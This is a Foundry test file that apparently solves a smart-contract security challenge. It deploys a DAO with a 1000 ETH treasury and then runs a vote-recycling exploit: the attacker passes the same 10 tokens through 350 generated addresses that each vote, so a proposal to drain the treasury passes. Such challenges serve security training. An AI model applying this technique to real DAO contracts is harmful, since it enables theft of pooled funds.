// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import {console, Test} from "forge-std/Test.sol";
import {TheGridDAO} from "../src/dao-attack-2/TheGridDAO.sol";
import {TheGridTreasury} from "../src/dao-attack-2/TheGridTreasury.sol";

contract TestTheGridDAO is Test {
    TheGridDAO thegriddao;
    TheGridTreasury thegridtreasury;

    // Governance Tokens
    uint256 constant DEPLOYER_TOKENS = 1500 ether;
    uint256 constant DAO_MEMBER_TOKENS = 1000 ether;
    uint256 constant ATTACKER_TOKENS = 10 ether;

    // ETH Balances
    uint256 constant ETH_IN_TRESURY = 1000 ether;

    // Proposals
    uint256 constant FIRST_PROPOSAL_AMOUNT = 0.1 ether;
    uint256 constant SECOND_PROPOSAL_AMOUNT = 1 ether;

    address deployer = makeAddr("deployer");
    address daomemberOne = makeAddr("daomemberOne");
    address daomemberTwo = makeAddr("daomemberTwo");
    address attacker = makeAddr("attacker");

    function setUp() external {
        vm.deal(deployer, 2000 ether);
        vm.deal(daomemberOne, 1000 ether);
        vm.deal(daomemberTwo, 1000 ether);
        vm.deal(attacker, 10 ether);

        // deploy contract
        vm.prank(deployer);
        thegriddao = new TheGridDAO();

        thegridtreasury = new TheGridTreasury(address(thegriddao));

        // ETH to Treasury
        (bool success, ) = address(thegridtreasury).call{value: ETH_IN_TRESURY}(
            ""
        );
        if (!success) revert("Failed Transaction");
        assertEq(address(thegridtreasury).balance, ETH_IN_TRESURY);

        // Mint tokens
        vm.startPrank(deployer);
        thegriddao.mint(deployer, DEPLOYER_TOKENS);
        thegriddao.mint(daomemberOne, DAO_MEMBER_TOKENS);
        thegriddao.mint(daomemberTwo, DAO_MEMBER_TOKENS);
        thegriddao.mint(attacker, ATTACKER_TOKENS);

        vm.stopPrank();
    }

    function test_daoattacktwo() external {
        // Depoyer proposes 2 proposals
        vm.startPrank(deployer);
        thegriddao.propose(deployer, FIRST_PROPOSAL_AMOUNT);
        thegriddao.propose(deployer, SECOND_PROPOSAL_AMOUNT);
        vm.stopPrank();

        // vote
        vm.prank(daomemberOne);
        thegriddao.vote(1, true);

        vm.prank(daomemberTwo);
        thegriddao.vote(1, false);

        // Second proposal should fail (Yes - 1500, No - 2000)
        vm.prank(daomemberOne);
        thegriddao.vote(2, false);

        vm.prank(daomemberTwo);
        thegriddao.vote(2, false);

        vm.warp(86401);
        vm.startPrank(deployer);
        thegriddao.setTreasury(address(thegridtreasury));
        thegriddao.execute(1);

        uint256 treasuryBalanceAfterFirstProposal = ETH_IN_TRESURY -
            FIRST_PROPOSAL_AMOUNT;
        assertEq(
            address(thegridtreasury).balance,
            treasuryBalanceAfterFirstProposal
        );
        vm.warp(86401);
        thegriddao.execute(2);
        assertEq(
            address(thegridtreasury).balance,
            treasuryBalanceAfterFirstProposal
        );

        vm.stopPrank();

        // Both proposal processed
        (, , , , , , bool processed) = thegriddao.getProposal(1);
        assertEq(processed, true);

        (, , , , , , bool process) = thegriddao.getProposal(2);
        assertEq(process, true);

        // Attack
        vm.prank(attacker);
        thegriddao.propose(attacker, treasuryBalanceAfterFirstProposal);

        // create a propose with attacker
        // attacker has 10token
        // for loop generate address -> transfer token and vote.
        address defaultattacker = attacker;

        for (uint i = 0; i < 350; ) {
            string memory uniqueName = string(abi.encodePacked("Name", i));
            address user = makeAddr(uniqueName);
            vm.prank(defaultattacker);
            thegriddao.transfer(user, ATTACKER_TOKENS);

            defaultattacker = user;
            vm.prank(defaultattacker);
            thegriddao.vote(3, true);

            unchecked {
                ++i;
            }
        }
        // Second proposal should fail (Yes - 1500, No - 2000)
        vm.prank(daomemberOne);
        thegriddao.vote(3, false);

        vm.prank(daomemberTwo);
        thegriddao.vote(3, false);

        vm.warp(172801);
        vm.startPrank(attacker);
        thegriddao.execute(3);
        console.log(attacker.balance);
    }
}
